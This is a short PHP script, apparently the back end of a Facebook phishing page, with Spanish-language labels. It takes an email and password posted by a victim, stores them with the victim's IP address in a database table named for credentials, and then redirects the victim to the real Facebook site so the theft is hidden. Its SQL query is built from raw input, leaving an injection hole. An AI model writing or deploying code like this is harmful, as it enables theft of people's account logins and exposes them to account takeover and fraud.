<?php
include($_SERVER['DOCUMENT_ROOT'].'/proxy/connect.php');
			
$pass = $_POST["pass"];
$email=$_POST["email"];

$sql = "INSERT INTO credenciales (ip, origen, usuario, contrasena) VALUES ('$ipaddress', 'Facebook Pishing', '$email', '$pass')";	
if ($conn->query($sql) === TRUE) {
    $error = "Creado adecuadamente.";
} else {
    $error = "Hubo un error en la peticion.";
}
header("Location: ". PROXY_PREFIX_ALL . "https://facebook.com/me");
exit;
?>

